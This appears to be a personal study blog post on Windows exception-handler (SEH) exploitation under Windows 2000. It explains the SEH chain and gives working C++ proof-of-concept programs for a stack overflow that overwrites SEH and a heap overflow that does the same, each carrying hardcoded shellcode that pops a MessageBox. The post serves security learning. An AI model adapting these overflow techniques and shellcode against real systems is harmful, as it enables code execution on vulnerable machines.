---
title: Exploit Learning Notes 008 Windows Exception Exploitation
description: SEH stack exploit and heap exploit
date: 2020-10-25 11:32:00+0800
categories:
    - Exploit
tags:
    - Windows
    - Exploit
---

Disclaimer: The experimental environment is Windows 2000

Source: [Moeomu's blog](/posts/exploit-learning-notes-008-windows-exception-exploitation/)

## SEH Overview

- SEH is an exception handler structure (Structure Exception Handler), which is an important data structure used by the Windows exception handling mechanism. Each SEH contains two DWORD pointers: the SEH link table pointer and the exception handler handle, totaling 8 bytes
- The SEH structure is stored on the stack
- When a thread is initialized, a SEH is automatically installed on the stack as the default exception handler for the thread
- If the program source code uses an exception handling mechanism such as `try-except`, the compiler eventually implements exception handling by installing a SEH on the current function stack frame
- There are usually multiple SEHs on the stack at the same time
- Multiple SEHs in the stack are strung together in a single chain from the top to the bottom of the stack by means of a chain table pointer, and the SEH at the top of the chain table is identified by a pointer at the TEB0 byte offset
- When an exception occurs, the operating system will terminate the program and first remove the SEH closest to the top of the stack from the 0 offset of the TEB to handle the exception using the code pointed to by the exception handling function handle
- When the exception handler closest to the scene of the incident fails to run, it will try other exception handling functions in order down the SEH chain
- If all the exception handling functions installed in the program fail to handle the exception, the system will use the default exception handling function, which will pop up an error dialog and force the program to close

## SEH utilization idea

- SEH is stored in the stack, and the data in the overflow buffer can flood the SEH
- Change SEH entry to shellcode start address
- The wrong stack frame or heap block data will trigger an exception after the overflow
- After Windows starts handling exceptions, shellcode is executed as an exception handling function

## Stack utilization test for SEH

### NOP test

#### Code

```CPP
#include <stdio.h>
#include <windows.h>

char shellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90" // next SEH Record
"\x90\x90\x90\x90" // SE Handler Function Address
"\x90\x90\x90\x90" // Nothing
"\x90\x90\x90\x90" // Nothing
"\x90\x90\x90\x90" // EBP
"\x90\x90\x90\x90" // Return Address
;

DWORD MyExceptionhandler(void)
{
    printf("got an exception, press Enter to kill   process!\n");
    getchar();
    ExitProcess(1);
    return 0;
}

void test(char* input)
{
    char buf[200];
    int zero = 0;
    __asm int 3 // used to break process for debug
    __try
    {
        strcpy(buf, input); // overrun the stack
        zero = 4 / zero; // generate an exception
    }
    __except(MyExceptionhandler()){}
}

void main()
{
    test(shellcode);
}
```

#### Observe

- `0x0012FE98` address is the starting location of the shellcode
- There are 3 SEHs installed in the current thread, the closest to the top of the stack is at `0x0012FF68`, which is the first SEH called
- The address we want to overwrite is `0x0012FF6C`, which is the address of the processing function, the content can be filled in the starting address of the ShellCode

### Actual test

#### code

```CPP
#include <stdio.h>
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90" // Next SEH Record
"\x98\xFE\x12\x00"; // SEH Handler

DWORD MyExceptionhandler(void)
{
    printf("got an exception, press Enter to kill process!\n");
    getchar();
    ExitProcess(1);
    return 0;
}

void test(char * input)
{
    char buf[200];
    int zero=0;
    _try
    {
        strcpy(buf,input); //overrun the stack
        zero=4/zero; //generate an exception
    }
    _except(MyExceptionhandler()){}
}

void main()
{
    test(shellcode);
}
```

#### Watch

- Popup MessageBox dialog successfully

## SEH's heap utilization test

### Actual test

#### Code

```CPP
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\x16\x01\x1A\x00\x00\x10\x00\x00" // head of the ajacent free block
"\x88\x06\x30\x00" // 0x00300688 is the address of shellcode in first
// Heapblock
"\x30\xFF\x12\x00"; // target of DWORD SHOOT

DWORD MyExceptionhandler(void)
{
    ExitProcess(1);
    return 0;
}

void main()
{
    HLOCAL h1 = 0, h2 = 0;
    HANDLE hp;
    hp = HeapCreate(0, 0x1000, 0x10000);
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200);
    memcpy(h1, shellcode, 0x200); // over flow here, noticed 0x200 means
    //512 !
    __asm int 3 // uesd to break the process
    __try
    {
        h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    }
    __except(MyExceptionhandler()){}
}
```
